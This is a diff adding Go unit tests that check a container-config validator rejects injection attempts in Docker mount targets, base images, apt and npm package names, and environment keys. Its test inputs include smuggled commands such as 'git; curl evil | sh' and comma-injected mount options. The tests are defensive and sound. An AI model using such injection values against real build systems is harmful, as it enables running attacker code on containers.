@@ -322,6 +322,47 @@ func TestValidateRejectsControlCharInTarget(t *testing.T) {
 	}
 }
 
+func TestValidateRejectsCommaInTarget(t *testing.T) {
+	// A comma injects extra fields into docker's comma-delimited --mount value.
+	m := Config{Mounts: []Mount{{Host: "/h", Target: "/x,readonly"}}}
+	if err := m.Validate(); err == nil {
+		t.Fatal("expected rejection of comma in mount target (--mount option injection)")
+	}
+	v := Config{Volumes: []Volume{{Name: "v", Role: "cache", Target: "/x,volume-opt=device=/"}}}
+	if err := v.Validate(); err == nil {
+		t.Fatal("expected rejection of comma in volume target")
+	}
+}
+
+func TestValidateContent(t *testing.T) {
+	bad := map[string]Config{
+		"base newline":     {Base: "debian\nRUN evil"},
+		"base space":       {Base: "debian AS x"},
+		"apt shell":        {Apt: []string{"git; curl evil | sh"}},
+		"apt space":        {Apt: []string{"git curl"}},
+		"npm shell":        {NpmGlobal: []string{"pkg && evil"}},
+		"npm redirect":     {NpmGlobal: []string{"pkg@>1 x"}},
+		"env key space":    {Env: map[string]string{"A B": "v"}},
+		"env key newline":  {Env: map[string]string{"A\nENV X": "v"}},
+		"env key leading$": {Env: map[string]string{"1A": "v"}},
+	}
+	for name, c := range bad {
+		if err := c.Validate(); err == nil {
+			t.Errorf("%s: expected rejection, got nil", name)
+		}
+	}
+	// Legitimate specs must still pass.
+	ok := Config{
+		Base:      "registry.example.com:5000/org/img@sha256:abc",
+		Apt:       []string{"git", "build-essential", "libssl-dev", "python3=3.11.2"},
+		NpmGlobal: []string{"@anthropic-ai/claude-code", "typescript", "pnpm@8.15.0"},
+		Env:       map[string]string{"NODE_ENV": "production", "_FOO": "1"},
+	}
+	if err := ok.Validate(); err != nil {
+		t.Fatalf("valid content rejected: %v", err)
+	}
+}
+
 func TestValidatePorts(t *testing.T) {
 	ok := Config{Ports: []Port{{Container: 8080, Host: 8080, Interface: "127.0.0.1"}, {Container: 3000}}}
 	if err := ok.Validate(); err != nil {
